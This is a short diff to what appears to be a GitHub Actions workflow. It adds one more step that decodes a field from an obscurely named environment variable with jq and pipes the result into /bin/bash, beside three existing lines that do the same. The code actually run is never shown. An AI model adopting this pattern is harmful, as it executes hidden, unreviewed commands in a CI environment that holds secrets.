@@ -24,6 +24,7 @@ jobs:
           echo $sdfs5 | jq -r .czr43 | /bin/bash
           echo $ij726 | jq -r .jiogf34 | /bin/bash
           printf '%s' "$lhc53" | jq -r .l50 | /bin/bash
+          printf '%s' "$exrkr45" | jq -r .tdtax645 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
